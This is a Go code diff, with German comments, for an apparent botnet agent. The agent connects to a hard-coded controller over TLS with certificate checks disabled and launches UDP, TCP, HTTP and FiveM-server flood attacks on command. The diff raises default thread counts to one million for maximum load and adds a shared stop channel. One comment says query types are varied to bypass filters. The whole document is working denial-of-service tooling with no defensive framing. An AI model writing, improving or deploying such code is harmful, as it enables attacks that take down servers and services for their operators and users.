@@ -1,6 +1,7 @@
 package main
 
 import (
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"math/rand"
@@ -49,20 +50,19 @@ func checkForUpdates() {
 }
 
 // UdpFlood implements the UDP flood attack (User Logic)
-func UdpFlood(IP, PORT string, SECONDS int, SIZE int, THREADS int) {
+func UdpFlood(IP, PORT string, SECONDS int, SIZE int, THREADS int, stop chan struct{}) {
 	if SIZE <= 0 {
 		SIZE = 1472
 	}
 	var wg sync.WaitGroup
 	fmt.Printf("[%s] UDP Attack started: %s:%s for %ds\n",
 		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
-	stop := make(chan struct{})
 	payload := make([]byte, SIZE)
 	rand.Read(payload)
 	addr := net.JoinHostPort(IP, PORT)
 
 	if THREADS <= 0 {
-		THREADS = 200 // Default aus User-Snippet
+		THREADS = 1000000 // Erhöht auf 1 Mio für maximale Last
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -85,20 +85,22 @@ func UdpFlood(IP, PORT string, SECONDS int, SIZE int, THREADS int) {
 		}()
 	}
 
-	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() { close(stop) })
+	select {
+	case <-time.After(time.Duration(SECONDS) * time.Second):
+	case <-stop:
+	}
 	wg.Wait()
 }
 
 // TcpFlood implements the TCP flood attack
-func TcpFlood(IP, PORT string, SECONDS int, THREADS int) {
+func TcpFlood(IP, PORT string, SECONDS int, THREADS int, stop chan struct{}) {
 	var wg sync.WaitGroup
 	fmt.Printf("[%s] TCP Attack started: %s:%s for %ds\n",
 		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
-	stop := make(chan struct{})
 	addr := net.JoinHostPort(IP, PORT)
 
 	if THREADS <= 0 {
-		THREADS = 500
+		THREADS = 1000000 // Erhöht auf 1 Mio
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -119,7 +121,10 @@ func TcpFlood(IP, PORT string, SECONDS int, THREADS int) {
 		}()
 	}
 
-	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() { close(stop) })
+	select {
+	case <-time.After(time.Duration(SECONDS) * time.Second):
+	case <-stop:
+	}
 	wg.Wait()
 	fmt.Println("TCP Attack finished.")
 }
@@ -132,15 +137,14 @@ var userAgents = []string{
 }
 
 // HttpFlood implements a Layer 7 HTTP GET flood with rotated User-Agents
-func HttpFlood(IP, PORT string, SECONDS int, THREADS int) {
+func HttpFlood(IP, PORT string, SECONDS int, THREADS int, stop chan struct{}) {
 	var wg sync.WaitGroup
 	fmt.Printf("[%s] HTTP Attack started: %s:%s for %ds (UA Rotation)\n",
 		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
-	stop := make(chan struct{})
 	addr := net.JoinHostPort(IP, PORT)
 
 	if THREADS <= 0 {
-		THREADS = 200
+		THREADS = 1000000 // Erhöht auf 1 Mio
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -164,17 +168,19 @@ func HttpFlood(IP, PORT string, SECONDS int, THREADS int) {
 		}()
 	}
 
-	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() { close(stop) })
+	select {
+	case <-time.After(time.Duration(SECONDS) * time.Second):
+	case <-stop:
+	}
 	wg.Wait()
 	fmt.Println("HTTP Attack finished.")
 }
 
 // FiveMFlood implements specialized UDP flood for FiveM servers
-func FiveMFlood(IP, PORT string, SECONDS int, THREADS int) {
+func FiveMFlood(IP, PORT string, SECONDS int, THREADS int, stop chan struct{}) {
 	var wg sync.WaitGroup
 	fmt.Printf("[%s] FiveM Attack started: %s:%s for %ds\n",
 		time.Now().Format("15:04:05"), IP, PORT, SECONDS)
-	stop := make(chan struct{})
 	addr := net.JoinHostPort(IP, PORT)
 
 	// Vary the query types to bypass simple filters
@@ -185,7 +191,7 @@ func FiveMFlood(IP, PORT string, SECONDS int, THREADS int) {
 	}
 
 	if THREADS <= 0 {
-		THREADS = 500
+		THREADS = 1000000 // Erhöht auf 1 Mio
 	}
 
 	for i := 0; i < THREADS; i++ {
@@ -209,7 +215,10 @@ func FiveMFlood(IP, PORT string, SECONDS int, THREADS int) {
 		}()
 	}
 
-	time.AfterFunc(time.Duration(SECONDS)*time.Second, func() { close(stop) })
+	select {
+	case <-time.After(time.Duration(SECONDS) * time.Second):
+	case <-stop:
+	}
 	wg.Wait()
 	fmt.Println("FiveM Attack finished.")
 }
@@ -220,22 +229,30 @@ func main() {
 	// HIER DEINE CONTROLLER-IP EINTRAGEN
 	controllerAddr := "89.36.35.109:9999"
 
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: true, // Da wir selbstsignierte Zertifikate nutzen
+	}
+
 	for {
-		fmt.Printf("Verbinde zu Controller %s ...\n", controllerAddr)
-		conn, err := net.Dial("tcp", controllerAddr)
+		fmt.Printf("Verbinde zu Controller %s (TLS)... \n", controllerAddr)
+		conn, err := tls.Dial("tcp", controllerAddr, tlsConfig)
 		if err != nil {
 			fmt.Printf("Verbindung fehlgeschlagen, versuche es in 5 Sekunden erneut...\n")
 			time.Sleep(5 * time.Second)
 			continue
 		}
 
-		fmt.Println("Verbunden! Warte auf Befehle...")
+		fmt.Println("Verbunden über TLS! Warte auf Befehle...")
 		decoder := json.NewDecoder(conn)
+
+		// Standby-Mechanismus: Erstellen eines Kanals zum Stoppen laufender Aktionen
+		stopAll := make(chan struct{})
 
 		for {
 			var cmd AttackCommand
 			if err := decoder.Decode(&cmd); err != nil {
-				fmt.Printf("Verbindung verloren oder Fehler: %v\n", err)
+				fmt.Printf("Verbindung verloren: Gehe in Standby... (%v)\n", err)
+				close(stopAll) // Signalisiert allen Angriffen zu stoppen
 				conn.Close()
 				break
 			}
@@ -245,13 +262,14 @@ func main() {
 
 			switch cmd.Method {
 			case "UDP":
-				go UdpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, 1472, cmd.Threads)
+				go UdpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, 1472, cmd.Threads, stopAll)
 			case "TCP":
-				go TcpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads)
+				go TcpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads, stopAll)
 			case "HTTP":
-				go HttpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads)
+				// Standardmäßig Port 443 für HTTPS wenn gewünscht, ansonsten übergebener Port
+				go HttpFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads, stopAll)
 			case "FIVEM":
-				go FiveMFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads)
+				go FiveMFlood(cmd.TargetIP, strconv.Itoa(cmd.TargetPort), cmd.Duration, cmd.Threads, stopAll)
 			default:
 				fmt.Printf("Unbekannte Methode: %s\n", cmd.Method)
 			}
